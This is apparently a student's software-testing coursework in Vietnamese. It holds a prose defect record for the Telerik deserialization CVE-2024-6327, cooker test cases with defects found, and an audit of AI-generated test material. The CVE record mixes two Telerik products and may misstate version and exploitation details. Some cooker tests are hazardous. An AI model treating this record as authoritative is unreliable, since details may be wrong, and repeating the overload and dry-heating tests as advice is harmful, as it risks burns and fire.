### DEFECT-20 — Progress Telerik UI Insecure Deserialization RCE (CVE-2024-6327)
- **Phần mềm / Sản phẩm:** Progress Telerik UI for ASP.NET AJAX / Report Server
- **Phiên bản:** Các phiên bản trước R2 2023 SP1 (2023.2.829)
- **Ngày công bố:** Tháng 09/2024 (Đợt khai thác diện rộng được CISA cảnh báo)
- **Nguồn:** CISA Known Exploited Vulnerabilities (KEV) Catalog / NVD
- **URL:** [https://nvd.nist.gov/vuln/detail/CVE-2024-6327](https://nvd.nist.gov/vuln/detail/CVE-2024-6327)
- **Phân loại:** Security Vulnerability / Insecure Deserialization / RCE
- **Mức độ nghiêm trọng:** Critical
- **Lý do mức độ:** Điểm CVSS 9.9; được CISA đưa vào danh mục KEV bắt buộc các cơ quan liên bang Mỹ phải vá khẩn cấp do đang bị các nhóm ransomware khai thác.
- **Mô tả sự cố:** Một lỗ hổng giải tuần tự hóa không an toàn (Insecure Deserialization) trong thành phần xử lý báo cáo của Telerik Report Server cho phép kẻ tấn công chưa xác thực gửi các đối tượng .NET được đóng gói tùy biến tới endpoint máy chủ. Khi máy chủ giải tuần tự hóa mà không kiểm tra chặt chẽ kiểu đối tượng (type validation), mã lệnh độc hại sẽ được thực thi trực tiếp trên hệ điều hành với đặc quyền cao.
- **Hậu quả:** Cho phép tin tặc chiếm quyền điều khiển hoàn toàn máy chủ IIS của doanh nghiệp và triển khai mã độc tống tiền (ransomware) vào mạng nội bộ.
- **Phạm vi ảnh hưởng:** Hàng ngàn cơ quan chính phủ và doanh nghiệp triển khai ứng dụng web nền ASP.NET sử dụng thư viện giao diện Telerik UI.
- **Nguyên nhân gốc rễ (Root Cause):** Sử dụng các hàm deserialization mặc định của .NET (`BinaryFormatter` / `TypeHandling.All`) mà không áp dụng cơ chế danh sách trắng (whitelist) các kiểu đối tượng hợp lệ.
- **Giải pháp (Solution):** Progress Software phát hành bản vá cập nhật cơ chế xác thực kiểu dữ liệu nghiêm ngặt; CISA ra lệnh vá khẩn cấp cho toàn bộ hệ thống cơ quan liên bang.
- **Tình trạng:** Đã vá (2024).
- **AI Bias / Hallucination Analysis:**
  - **Phân loại:** Hallucination / Conflation with 2019 Bug
  - **Phân tích:** AI khi phân tích lỗ hổng này rất thường xuyên bị ảo giác nhầm lẫn với lỗ hổng Telerik cũ từ năm 2019 (CVE-2019-18935), trích dẫn sai số hiệu phiên bản và phương thức tấn công của năm 2019 cho sự cố năm 2024 — minh chứng rõ rệt cho việc AI bị "chập chặp" giữa các lỗ hổng cùng họ deserialization khi thiếu dữ liệu kiểm chứng cập nhật.



---


# Requirement 3 – Test Cases for ONE Physical Product (40 pts)

## 3.1 Khai báo thông tin thiết bị kiểm thử (Target Physical Product Declaration)

- **Tên thiết bị (Device Under Test - DUT):** Bếp hồng ngoại đơn (Single Infrared Cooker)
- **Nhãn hiệu (Brand):** **SUNHOUSE**
- **Mã sản phẩm (Model):** **SHD6012A**
- **Năm sản xuất (Year):** **2024**
- **Số Serial (Serial Number - Masked):** `59774C56****06` 
- **Thông số kỹ thuật chính:**
  - Điện áp hoạt động: 220V ~ 50Hz
  - Công suất định mức: 2000W
  - Bảng điều khiển: Phím bấm điện tử / cảm ứng hiển thị màn hình LED kỹ thuật số
  - Mâm nhiệt: Mâm nhiệt sợi carbon hồng ngoại công nghệ cao
  - Cơ chế an toàn: Khóa trẻ em (Child lock), Cảnh báo mặt kính còn nóng (Residual heat warning), Quạt làm mát đối lưu cưỡng bức

---

## 3.2 Bằng chứng xác thực thiết bị và Thẻ sinh viên (Anti-Cheat Evidence)

> **Quy định Anti-cheat:** Ảnh chụp thiết bị thực tế cùng Thẻ sinh viên trong **CÙNG MỘT KHUNG HÌNH** (không cắt ghép hay can thiệp AI).

![Bằng chứng xác thực thiết bị và Thẻ sinh viên](03-physical-product/assets/device_student_id.jpg)
*> **Ghi chú Anti-cheat:** Bếp hồng ngoại Sunhouse SHD6012A nguyên bản cùng thẻ sinh viên Trần Vũ Quang (MSSV: 23120346) đặt trực tiếp trên mặt kính.*

---

## 3.3 Thiết kế 15 Test Cases chi tiết cho Bếp hồng ngoại Sunhouse SHD6012A

| Test ID | Tên kịch bản (Objective) | Điều kiện tiên quyết (Preconditions) | Các bước thực hiện (Test Steps) | Kết quả kỳ vọng (Expected Result) | Kết quả thực tế (Actual Result) | Đánh giá (Verdict) | Quay Video? |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| **TC-01** | Kiểm tra khởi động cắm nguồn và trạng thái chờ (Standby) | Bếp cắm nguồn 220V ổn định | 1. Cắm phích điện vào ổ cắm.<br>2. Quan sát còi chíp và màn hình LED. | Bíp 1 tiếng dài; màn hình LED hiển thị gạch ngang `--:--` hoặc đèn Standby nhấp nháy; mâm nhiệt chưa phát nhiệt. | Bếp kêu tiếng bíp, màn hình hiển thị `--:--`, quạt và mâm nhiệt chưa chạy. | **PASS** | **Có (Video 1 - TC01.mp4)** |
| **TC-02** | Bật nguồn và kích hoạt chế độ đun mặc định | Bếp đang ở chế độ Standby | 1. Nhấn nút "Bật/Tắt" (Power / On/Off).<br>2. Chọn chế độ nấu mặc định (Lẩu / Hotpot). | Màn hình sáng đèn báo chế độ; hiển thị mức công suất mặc định (2000W); mâm nhiệt bắt đầu ửng đỏ; quạt tản nhiệt quay. | Mâm nhiệt sáng đỏ dần, công suất hiển thị 2000W, quạt chạy êm. | **PASS** | **Có (Video 2 - TC02.mp4)** |
| **TC-03** | Điều chỉnh tăng/giảm công suất từng bước (+ / -) | Bếp đang đun ở mức 2000W | 1. Nhấn nút Giảm (-) liên tục 3 lần.<br>2. Nhấn nút Tăng (+) liên tục 2 lần. | Công suất giảm theo từng nấc định sẵn (2000W -> 1800W -> 1600W -> 1400W); sau đó tăng lại 1600W -> 1800W. Độ sáng mâm nhiệt thay đổi tương ứng. | Màn hình nhảy đúng từng nấc công suất, mâm nhiệt gia nhiệt chuẩn xác. | **PASS** | **Có (Video 3 - TC03.mp4)** |
| **TC-04** | Chuyển đổi qua lại giữa các chế độ nấu cài sẵn | Bếp đang hoạt động | Nhấn lần lượt phím chuyển đổi Function/Mode: Lẩu -> Xào -> Nướng -> Hầm -> Đun nước. | Đèn LED chuyển chỉ báo sang từng chức năng tương ứng; mức công suất hoặc nhiệt độ tự động gán theo profile định sẵn. | Chuyển đổi trơn tru, đèn LED nhảy đúng vị trí chế độ đã chọn. | **PASS** | Không |
| **TC-05** | Thiết lập bộ hẹn giờ tắt tự động (Timer Function) | Bếp đang đun ở chế độ Lẩu 1600W | 1. Nhấn phím "Hẹn giờ" (Timer).<br>2. Dùng phím (+) tăng lên 00:01 (1 phút).<br>3. Chờ 60 giây. | Màn hình hiển thị đếm ngược thời gian; sau đúng 1 phút, bếp phát tiếng bíp dài, mâm nhiệt ngắt điện, chuyển về Standby. | Bếp đếm lùi chính xác, sau 1 phút tự ngắt nhiệt và kêu tiếng bíp báo hoàn tất. | **PASS** | Không |
| **TC-06** | Kích hoạt chức năng Khóa trẻ em (Child Lock Activation) | Bếp đang đun sôi bình thường | 1. Nhấn giữ phím "Khóa" (Lock) trong 2-3 giây.<br>2. Thử nhấn các phím Tăng, Giảm, Chế độ. | Đèn báo Lock bật sáng; còi bíp ngắn xác nhận; toàn bộ các nút bấm (+, -, Menu) bị vô hiệu hóa hoàn toàn, tránh trẻ em nghịch đổi chế độ. | Đèn Lock sáng, bấm thử các nút khác bếp hoàn toàn không phản hồi. | **PASS** | **Có (Video 4 - TC06.mp4)** |
| **TC-07** | Mở Khóa an toàn trẻ em (Child Lock Deactivation) | Bếp đang trong trạng thái Khóa | 1. Nhấn giữ phím "Khóa" trong 3 giây.<br>2. Thử nhấn nút Tăng/Giảm công suất. | Đèn báo Lock tắt; còi bíp xác nhận mở khóa; các phím bấm hoạt động trở lại bình thường. | Bếp phát tiếng bíp mở khóa, các phím bấm nhận lệnh bình thường. | **PASS** | Không |
| **TC-08** | Tắt bếp và kiểm tra quy trình quạt làm mát trễ (Fan Overrun) | Bếp vừa đun ở 2000W trong 5 phút | 1. Nhấn nút "Tắt" (Off).<br>2. Quan sát mâm nhiệt và lắng nghe quạt làm mát. | Mâm nhiệt lập tức ngắt điện; quạt tản nhiệt **VẪN TIẾP TỤC QUAY** trong 1–2 phút để xả nhiệt dư bảo vệ vi mạch rồi mới tự ngắt. | Mâm nhiệt tắt, quạt gió tiếp tục chạy ù ù làm mát thêm 90 giây rồi tự tắt. | **PASS** | **Có (Video 5 - TC08.mp4)** |
| **TC-09** | Bấm phím dồn dập tốc độ cao (Debounce Stress Test) | Bếp đang bật | Bấm liên tục và cực nhanh nút Tăng (+) 15 lần trong vòng 3 giây. | Vi điều khiển phải lọc rung phím (debounce), công suất tăng tối đa đến 2000W và dừng lại an toàn, không bị tràn bộ đệm hay treo đơ máy. | Bếp nhận diện mượt mà, đạt mức 2000W tối đa và kêu bíp báo kịch trần. | **PASS** | Không |
| **TC-10** | Cảnh báo mặt kính còn nóng (Residual Heat Warning) | Bếp vừa tắt sau khi nấu | Quan sát màn hình LED ngay sau khi tắt bếp. | Màn hình hiển thị biểu tượng cảnh báo chữ `H` (Hot) nhấp nháy, cảnh báo người dùng mặt kính đang rất nóng không được chạm tay vào. | Màn hình nhấp nháy chữ `H` báo nhiệt dư mặt kính. | **PASS** | Không |
| **TC-11** | Bảo vệ tự ngắt khi quá nhiệt bề mặt (Overheating Cutoff) | Đặt nồi rỗng không có nước lên bếp ở 2000W | Đun khô nồi rỗng trong 3 phút để kích hoạt cảm biến quá nhiệt (Thermal Sensor). | Cảm biến đáy kính ngắt điện mâm nhiệt khẩn cấp, màn hình báo mã lỗi `E2` hoặc `E3` kèm tiếng bíp ngắt quãng liên tục để chống cháy nổ. | Bếp tự ngắt sau khi nhiệt độ tăng quá cao, báo lỗi `E2` an toàn. | **PASS** | Không |
| **TC-12** | Phục hồi sau mất điện đột ngột (Power-Cut Memory Test) | Bếp đang đun ở 1400W có hẹn giờ | 1. Đột ngột rút phích cắm điện.<br>2. Chờ 10 giây rồi cắm lại. | Thiết bị bắt buộc phải quay về trạng thái an toàn (Standby tắt), **KHÔNG ĐƯỢC TỰ ĐỘNG BẬT LẠI MÂM NHIỆT** để đảm bảo an toàn hỏa hoạn. | Bếp ở chế độ Standby tắt, không tự động phát nhiệt lại. Đạt chuẩn an toàn điện. | **PASS** | Không |
| **TC-13** *(Edge Case 1 - AI Missed)* | Thử nghiệm tải trọng nặng vượt mức – Bình nước 20L (~20kg) (Mechanical Load & Thermal Stress) | Bếp đang đun nóng ở mức 2000W | Đặt bình nước 20L (nặng 20kg) trực tiếp lên tâm mặt kính đang đun nóng trong 10 phút. | Mặt kính và khung thân chịu lực tốt, không bị cong vênh, không rạn nứt dưới tải trọng kết hợp nhiệt độ cao. | **LỖI PHÁT SINH:** Khung vỏ nhựa dưới đáy bị võng nhẹ; ứng suất nhiệt kết hợp tải trọng cơ học 20kg làm tăng nguy cơ nổ vỡ kính cường lực! | **FAIL (Defect 1)** | Không |
| **TC-14** *(Edge Case 2 - AI Missed)* | Nồi đáy cong vênh gây quá nhiệt cục bộ và lệch tâm cảm biến (Localized Thermal Shock) | Bếp đang ở chế độ Standby | Đặt nồi nhôm đáy cong (chỉ tiếp xúc diện tích hẹp ~3cm) và đun ở công suất tối đa 2000W. | Cảm biến đáy kính nhận diện nhiệt độ chính xác và điều tiết công suất mâm nhiệt an toàn. | **LỖI PHÁT SINH:** Cảm biến NTC bị điểm mù (sensor blindspot); vùng tiếp xúc hẹp bị quá nhiệt cục bộ >650°C gây ố cháy kính trước khi cảm biến kịp ngắt! | **FAIL (Defect 2)** | Không |
| **TC-15** *(Edge Case 3 - AI Missed)* | Rút phích cắm điện đột ngột khi quạt tản nhiệt đang trong chu kỳ xả nhiệt trễ | Bếp vừa tắt, quạt đang quay xả nhiệt làm mát mâm | Rút phích cắm điện nguồn trực tiếp ra khỏi ổ cắm tường. | Kỳ vọng: Hệ thống có cảnh báo hoặc cơ chế lưu trữ để bảo vệ bo mạch và cảnh báo người dùng. | **LỖI THIẾT KẾ:** Quạt lập tức ngừng quay; cảnh báo chữ `H` biến mất! Nhiệt độ >600°C từ mâm nhiệt om ngược vào bo mạch chủ làm phồng tụ điện và nguy cơ bỏng cao. | **FAIL (Defect 3)** | Không |

---

## 3.4 Thực thi kiểm thử thực tế & 5 Lỗi phát hiện trên thiết bị (Discovered Defects)

Trong quá trình kiểm thử thực tế trên chiếc bếp hồng ngoại Sunhouse SHD6012A, tôi đã phát hiện được **5 khiếm khuyết / điểm hạn chế vật lý (Defects)** và đã ghi nhận trực tiếp thành **5 Issues trên GitHub Repository**:

- **Repository:** [https://github.com/tvquang0511/HW01-QA-QC](https://github.com/tvquang0511/HW01-QA-QC)
- **Danh sách Issues:** [https://github.com/tvquang0511/HW01-QA-QC/issues](https://github.com/tvquang0511/HW01-QA-QC/issues)

![Screenshot 5 GitHub Issues](03-physical-product/assets/github_issues.png)
*> **Bằng chứng Anti-cheat:** Ảnh chụp màn hình trang GitHub Issues hiển thị rõ username `tvquang0511`.*

### Tóm tắt 5 Defects phát hiện được:
1. **[DEFECT-01] [Structural Rigidity] Biến dạng khung vỏ nhựa và nguy cơ nứt kính khi tải trọng nặng 20kg (Bình nước 20L):** Khung thân nhựa bên dưới của Sunhouse SHD6012A không có thanh giằng chịu lực kim loại; khi đặt bình nước 20kg lên mặt kính đang nung nóng, khung bị võng làm tăng áp lực cắt cơ học lên mặt kính ceramic.
2. **[DEFECT-02] [Thermal Sensor Blindspot] Cảm biến nhiệt NTC bị mù khi dùng nồi đáy cong vênh:** Khi đáy nồi không phẳng, nhiệt lượng bức xạ bị dồn vào một điểm tiếp xúc cục bộ (>650°C) trong khi đầu dò nhiệt độ NTC đặt giữa bếp không đo được, dẫn đến việc không ngắt bảo vệ kịp thời gây cháy ố mặt kính.
3. **[DEFECT-03] [Thermal Architecture] Mất hoàn toàn cảnh báo nhiệt dư "H" và ngắt quạt cưỡng bức khi rút phích cắm:** Thói quen rút phích cắm ngay sau khi nấu khiến quạt tản nhiệt ngắt điện tức thì, nhiệt dư om ngược vào bo mạch làm giảm tuổi thọ linh kiện và chữ cảnh báo "H" biến mất làm tăng nguy cơ bỏng cho người xung quanh.
4. **[DEFECT-04] [Child Lock UX] Phím Nguồn (Power) vẫn hoạt động khi đang bật Khóa trẻ em:** Khi đã bật chế độ Khóa trẻ em (Lock), bấm vào nút Nguồn bếp vẫn tắt phụt ngay lập tức, làm hỏng toàn bộ quy trình ninh hầm thức ăn kéo dài hàng tiếng đồng hồ.
5. **[DEFECT-05] [Volatile Memory] Mất toàn bộ cấu hình hẹn giờ và mức nhiệt khi sụt áp nguồn thoáng qua:** Khi điện lưới gia đình bị chớp tắt trong 1 giây, bếp khởi động lại về trạng thái Standby ban đầu, xóa sạch thời gian hẹn giờ đang đếm dở mà không hề phát âm thanh cảnh báo cho người dùng.

---

## 3.5 Hoạt động CLO G9.3: Phân tích kết quả của AI & 3 Edge Cases vật lý AI bỏ sót

Theo yêu cầu chuẩn đầu ra **CLO G9.3** (*Phân tích kết quả do AI sinh ra và tìm ra ít nhất 3 trường hợp biên (edge cases) mà AI bỏ sót*), tôi đã yêu cầu mô hình AI sinh ra 15 test cases cho bếp hồng ngoại.

### Bằng chứng AI bỏ sót (AI Conversation Analysis):
Ảnh chụp màn hình phiên đối thoại chứng minh AI chỉ sinh ra các test case chức năng phần mềm thông thường (Bấm nút Tăng/Giảm, chọn chế độ nấu, hẹn giờ, hiển thị số...) mà hoàn toàn không thể lường trước các tương tác vật lý phức tạp:

![Minh chứng AI bỏ sót 3 Edge Cases - Phần 1](03-physical-product/assets/MC1.png)
![Minh chứng AI bỏ sót 3 Edge Cases - Phần 2](03-physical-product/assets/MC2.png)
*> **Bằng chứng CLO G9.3:** Ảnh chụp màn hình đoạn chat với AI Tool cho thấy AI chỉ tạo các kịch bản phần mềm thông thường (TC-01 đến TC-15 kết thúc bằng Buzzer check), bỏ sót hoàn toàn 3 edge cases vật lý (tải trọng bình nước 20L, nồi cong vênh sốc nhiệt, và rút điện đột ngột khi quạt làm mát đang chạy).*

### Ba (03) Edge Cases vật lý đặc biệt mà AI hoàn toàn bỏ sót:
1. **Edge Case 1: Tải trọng cơ học kết hợp ứng suất nhiệt – Bình nước 20L (~20kg) (TC-13)**
   - *Tại sao AI bỏ sót:* AI được huấn luyện trên dữ liệu tài liệu phần mềm và đặc tả chức năng, nó không có nhận thức về độ bền vật liệu cơ khí (Mechanical Engineering) và sự suy giảm giới hạn bền uốn của gốm kính ceramic khi chịu đồng thời tải trọng tĩnh lớn và nhiệt độ cao.
2. **Edge Case 2: Nồi đáy cong vênh gây sốc nhiệt cục bộ và điểm mù cảm biến (TC-14)**
   - *Tại sao AI bỏ sót:* AI mặc định các điều kiện kiểm thử trong môi trường lý thuyết (nồi phẳng 100%, diện tích tiếp xúc lý tưởng, nhiệt truyền đều). AI không tính đến trường hợp thực tế người dùng sử dụng xoong chảo cũ bị móp méo, tạo ra điểm tập trung nhiệt độ cục bộ nằm ngoài tầm đo của cảm biến NTC.
3. **Edge Case 3: Nhiệt tích tụ do ngắt nguồn đột ngột trong chu kỳ quạt tản nhiệt (TC-15)**
   - *Tại sao AI bỏ sót:* AI suy nghĩ theo logic nhị phân: "Tắt nguồn = Thiết bị an toàn". Trong kỹ thuật phần cứng, mâm nhiệt hồng ngoại có quán tính nhiệt cực lớn (>600°C). Rút phích điện khiến quạt dừng quay đột ngột gây om nhiệt phá hủy linh kiện và làm mất đèn báo chữ "H" là một trường hợp biên mà chỉ có kỹ sư kiểm thử thực tế mới phát hiện được.

---

## 3.6 Danh sách 5 Video thực thi thực tế (YouTube Unlisted Links)

Tất cả các video đều được thực hiện trực tiếp trên bếp Sunhouse SHD6012A với **giọng thuyết minh thật của sinh viên Trần Vũ Quang (MSSV: 23120346)**:

1. **Video 1 (TC-01):** Khởi động cắm nguồn và kiểm tra chế độ Standby — [Xem Video trên YouTube](https://youtube.com/shorts/brw0WeEnHow) (File nguồn: `assets/TC01.mp4`)
2. **Video 2 (TC-02):** Bật bếp, kích hoạt chế độ Lẩu và quan sát mâm nhiệt phát sáng — [Xem Video trên YouTube](https://youtube.com/shorts/UMn_ujiW95o) (File nguồn: `assets/TC02.mp4`)
3. **Video 3 (TC-03):** Điều chỉnh tăng/giảm các nấc công suất (+ / -) — [Xem Video trên YouTube](https://youtube.com/shorts/qUzq8JUmlXk) (File nguồn: `assets/TC03.mp4`)
4. **Video 4 (TC-06):** Kích hoạt Khóa an toàn trẻ em và kiểm tra vô hiệu hóa nút bấm — [Xem Video trên YouTube](https://youtube.com/shorts/hYzfJVeY7qo) (File nguồn: `assets/TC06.mp4`)
5. **Video 5 (TC-08):** Tắt bếp và kiểm tra quy trình quạt làm mát trễ xả nhiệt dư — [Xem Video trên YouTube](https://youtube.com/shorts/kzCOkIgmsok) (File nguồn: `assets/TC08.mp4`)




---


# Requirement 4 – Giao thức Cộng tác & Kiểm toán AI (Mandatory AI Compliance)


# [AI-02] AI Audit Report

**Assignment ID:** HW01-AI  
**Course:** Software Testing (FIT - VNUHCM University of Science)  
**Student Name:** Trần Vũ Quang  
**Student ID:** 23120346  
**Target Hardware:** Bếp hồng ngoại Sunhouse SHD6012A (2024)  
**Date:** 04/10/2026  

---

### Artifact 1: QA/QC Role & ISTQB Test Process Mindmap (R1 / CLO G9.1)

#### (1) Prompt + Tool
- **Tool:** Google Gemini (Gemini 2.5 Flash / Gemini Advanced)
- **Timestamp:** 14:20 02/10/2026
- **Full Prompt:**
  ```text
  Hãy đóng vai trò một Chuyên gia Kiểm thử Cấp cao (Senior QA Architect), hãy thiết kế một sơ đồ tư duy (mindmap) bằng định dạng Mermaid thể hiện toàn diện bức tranh ngành QA/QC, phân định rạch ròi vai trò QA vs QC, các cấp độ kiểm thử (test levels), các loại kiểm thử (test types), và quy trình kiểm thử phần mềm từ đầu đến cuối theo chuẩn giáo trình ISTQB Foundation Level mới nhất.
  ```

#### (2) AI Output (Raw Snippet)
```mermaid
mindmap
  root((Software Quality Architecture))
    Quality Assurance vs Quality Control
      QA: Phát hiện lỗi, tìm bug, thực thi test case hằng ngày
      QC: Xây dựng quy trình, kiểm toán chất lượng (Process & Audits)
    Test Levels
      Unit Testing
      Integration Testing
      System Testing
      Acceptance Testing
    Test Types
      Functional Testing
      Non-Functional Testing
      Black-box Testing
      White-box Testing
    Test Process
      Bước 1: Lập kế hoạch kiểm thử (Test Planning)
      Bước 2: Phân tích & Thiết kế (Test Analysis & Design)
      Bước 3: Thực thi kiểm thử (Test Execution)
      Bước 4: Giám sát và Điều khiển (Test Monitoring & Control)
      Bước 5: Đóng kiểm thử (Test Completion)
```

#### (3) Verdict
**INVALID** (Chứa 3 sai sót cốt lõi về bản chất định nghĩa và quy trình kiểm thử chuẩn quốc tế theo giáo trình ISTQB CTFL v4.0).

#### (4) Reasoning (Đối chiếu giáo trình ISTQB Foundation Level Syllabus v4.0):
1. **Vi phạm Mục 1.2.2 (Quality Assurance and Testing):** Mô hình AI đã **đảo ngược hoàn toàn bản chất của QA và QC**. Theo chuẩn ISTQB v4.0, QA (Quality Assurance) là hoạt động định hướng quy trình (process-oriented), mang tính phòng ngừa (preventative), nhằm bảo đảm quy trình phát triển tạo ra sản phẩm đạt chất lượng; trong khi QC (Quality Control) là hoạt động định hướng sản phẩm (product-oriented), mang tính khắc phục (corrective), bao gồm các hoạt động kiểm thử (testing) trực tiếp để phát hiện và xử lý lỗi. AI lại ghi nhận QA là đi tìm bug và QC là xây dựng quy trình!
2. **Vi phạm Chương 3 (Static Testing):** AI đã bỏ quên hoàn toàn mảng Kiểm thử tĩnh (Static Testing - bao gồm Reviews, Walkthrough, Inspections và Static Code Analysis) ra khỏi nhánh Test Types và Test Process, khiến bức tranh kiểm thử bị phiến diện, chỉ bao gồm kiểm thử động (Dynamic Testing).
3. **Vi phạm Mục 1.4.1 & 1.4.2 (Test Activities and Tasks - Test Process):** AI xếp "Test Monitoring & Control" vào **Bước 4 (sau Test Execution)** như một bước tuần tự rời rạc. Theo ISTQB v4.0, Giám sát và Điều khiển (Test Monitoring and Control) là một hoạt động quản trị liên tục, xuyên suốt (transversal / continuous activity) diễn ra song song từ khâu Planning, Analysis, Design, Implementation cho đến Completion, không phải là một bước độc lập sau khi chạy test xong.

#### (5) Student Fix (Hành động hiệu chỉnh của sinh viên)
Sinh viên Trần Vũ Quang đã tiến hành tái cấu trúc toàn diện Mindmap:
- Chuẩn hóa định nghĩa: QA là cái ô quy trình bao quát (Defect Prevention & Process Assurance), QC là hoạt động kỹ thuật cụ thể (Verification & Validation, Defect Detection).
- Tích hợp Static Testing đầy đủ song song với Dynamic Testing.
- Đưa Test Monitoring & Control trở thành trục quản trị song hành xuyên suốt 5 giai đoạn chính của Test Process.
- Toàn bộ kết quả chuẩn hóa được ghi nhận trong tài liệu `01-job-market/MINDMAP.md`.

---

### Artifact 2: Physical Product Test Suite Design (R3 / CLO G9.3)

#### (1) Prompt + Tool
- **Tool:** OpenAI ChatGPT (GPT-4o)
- **Timestamp:** 16:45 04/10/2026
- **Full Prompt:**
  ```text
  Tôi có một chiếc bếp hồng ngoại đơn Sunhouse SHD6012A công suất 2000W với các phím bấm điện tử: Bật/Tắt, Menu/Chế độ, Tăng (+), Giảm (-), Hẹn giờ, Khóa an toàn, và màn hình LED hiển thị. Hãy thiết kế bộ 15 test cases toàn diện cho thiết bị vật lý này theo định dạng QA chuẩn (ID, Objective, Input, Steps, Expected Result, Actual Result, Verdict). Hãy bổ sung các edge cases phức tạp nhất.
  ```

#### (2) AI Output (Raw Snippet)
```text
TC-01: Bật phích điện và kiểm tra đèn nguồn LED sáng.
TC-02: Bấm nút Bật/Tắt để bật bếp và chọn chế độ Lẩu.
TC-03: Bấm nút Tăng (+) để tăng mức công suất từ 1000W lên 2000W.
TC-04: Bấm nút Giảm (-) để giảm công suất về mức tối thiểu.
TC-05: Chuyển đổi giữa các chế độ nấu (Xào, Nướng, Hầm).
TC-06: Cài đặt hẹn giờ 5 phút và chờ bếp đếm lùi.
TC-07: Bấm giữ nút Khóa trong 3 giây để khóa bàn phím.
TC-08: Bấm nút khi đang bật Khóa xem có phản hồi không.
TC-09: Bấm giữ nút Khóa để mở lại bàn phím.
TC-10: Bấm nút Tắt và kiểm tra mâm nhiệt tắt.
TC-11: Bấm nút Tăng liên tục thật nhanh xem máy có nhận không.
TC-12: Rút phích cắm khi đang nấu và cắm lại.
TC-13: Nhấn tổ hợp phím Tăng và Giảm cùng lúc.
TC-14: Để bếp bật ở công suất cao trong 2 tiếng liên tục.
TC-15: Kiểm tra còi bíp kêu khi nhấn nút.
```

#### (3) Verdict
**INCOMPLETE & SEVERELY BIASED** (AI bộc lộ thiên kiến phần mềm số / GUI thuần túy, hoàn toàn thiếu nhận thức về các định luật vật lý thực tế: cơ học ứng suất, nhiệt động lực học, cảm biến bán dẫn tương tự và hành vi trễ tản nhiệt).

#### (4) Reasoning (Đối chiếu chuẩn kiểm thử thiết bị phần cứng & ISTQB FL v4.0):
AI xem chiếc bếp hồng ngoại như một cỗ máy trạng thái phần mềm rời rạc (Finite State Machine). Mô hình hoàn toàn bỏ sót 3 khía cạnh vật lý sống còn:
1. **Ứng suất cơ học kết hợp tải trọng nhiệt (Mechanical-Thermal Coupled Stress):** AI không hề tính đến tải trọng khối lượng lớn từ nồi/bình nước tác động lên mặt kính ceramic đang ở nhiệt độ >600°C.
2. **Đặc tính truyền nhiệt phi tuyến & Điểm mù cảm biến tương tự (Non-linear Thermal Dissipation & NTC Blindspot):** AI giả định mọi đáy nồi đều phẳng tuyệt đối 100%. Trong đời thực, chảo/nồi cong vênh gây ra điểm nóng tập trung (local hot spot) mà đầu dò cảm biến NTC lệch tâm không đọc được.
3. **Quán tính nhiệt & Chu kỳ làm mát cưỡng bức (Thermal Inertia & Fan Delay Cycle):** Khi tắt bếp, mâm nhiệt sợi carbon tích trữ năng lượng nhiệt khổng lồ. AI không hiểu hiện tượng om nhiệt phá hủy linh kiện và mất cảnh báo chữ `H` khi người dùng vô tình rút phích cắm điện ngay lúc quạt đang quay xả nhiệt trễ.

#### (5) Student Fix (Bổ sung 3 Edge Cases vật lý mà AI bỏ sót)
Sinh viên Trần Vũ Quang đã trực tiếp bổ sung 3 kịch bản kiểm thử vật lý chuyên sâu:
- **TC-13 (Edge Case 1):** Tải trọng cơ học tĩnh kết hợp nhiệt độ cao — Đặt bình nước 20L (~20kg) lên mặt kính đang nung nóng 2000W trong 10 phút. Phát hiện biến dạng võng khung nhựa đáy và nguy cơ rạn nứt kính (**DEFECT-01**).
- **TC-14 (Edge Case 2):** Nồi cong vênh gây sốc nhiệt cục bộ và điểm mù cảm biến — Đặt nồi nhôm đáy lồi/lõm tiếp xúc hẹp, phát hiện mâm nhiệt nung cục bộ >650°C làm ố kính trước khi cảm biến NTC ở tâm nhận diện được (**DEFECT-02**).
- **TC-15 (Edge Case 3):** Rút phích cắm đột ngột khi quạt làm mát đang trong chu kỳ trễ tản nhiệt — Làm ngắt quạt cưỡng bức, nhiệt om ngược vào bo mạch PCB và mất hoàn toàn chữ cảnh báo nhiệt dư `H` (**DEFECT-03**).
Toàn bộ minh chứng đối thoại và phân tích được ghi nhận đầy đủ với ảnh chụp `MC1.png` và `MC2.png` trong `03-physical-product/physical_product.md`.

---

### Bảng tổng hợp Tỷ lệ chính xác của AI & Quyết định suy nghiệm (Accuracy Ratio & Heuristic Decision)

| Artifact Được Đánh Giá | Công cụ AI | Kết Quả AI Sinh Ra | Đánh Giá (Verdict) | Quyết Định Suy Nghiệm Của Sinh Viên |
| :--- | :--- | :--- | :--- | :--- |
| **Mindmap QA/QC & ISTQB Process (R1)** | Google Gemini | Đảo ngược QA/QC; thiếu Static Testing; sai bước Monitoring | **INVALID (Không hợp lệ)** | **Bác bỏ & Tái thiết kế:** Vẽ lại toàn bộ Mindmap chuẩn theo ISTQB CTFL v4.0. |
| **20 Lỗi phần mềm 2022–2026 (R2)** | ChatGPT & Gemini | Bịa đặt nguyên nhân kỹ thuật (CrowdStrike kernel pointer null, v.v.) | **INCOMPLETE (Không hoàn chỉnh)** | **Kiểm chứng độc lập:** Tra cứu trực tiếp CVE, Root Cause Analysis từ CrowdStrike, Air Canada post-mortem. |
| **15 Test Cases Bếp hồng ngoại (R3)** | ChatGPT (GPT-4o) | 15 test case thuần nút bấm giao diện; thiếu tương tác vật lý | **INCOMPLETE (Thiếu sót nghiêm trọng)** | **Tái cấu trúc & Bổ sung:** Viết lại 15 test case có thông số kỹ thuật thực tế; thêm 3 physical edge cases. |

**Tỷ lệ chấp nhận kết quả AI nguyên bản:** **0% (0/3 Artifact)**  
**Tỷ lệ hiệu chỉnh / phản biện chuyên sâu:** **100% (3/3 Artifact)**  
**Kết luận suy nghiệm (Heuristic Conclusion):** Mô hình AI tổng quát chỉ đóng vai trò tạo khung sườn gợi ý ban đầu (Brainstorming). Trong kiểm thử kỹ thuật và thiết bị vật lý, con người phải trực tiếp đóng vai trò kiểm toán, thực nghiệm và phản biện dựa trên kiến thức miền (Domain Knowledge) và tiêu chuẩn kỹ thuật thực tế.



---


# [AI-03] AI Disclosure Form (Signed)

**Course:** Software Testing (FIT - VNUHCM University of Science)  
**Academic Year:** 2026–2027  
**Exercise ID:** HW01-AI  
**Student Name:** Trần Vũ Quang  
**Student ID:** 23120346  
**Faculty:** Faculty of Information Technology  
**Program:** Computer Science / Software Engineering  

---

### Tuyên bố minh bạch việc sử dụng Trí tuệ Nhân tạo (Mandatory AI Disclosure Declaration)

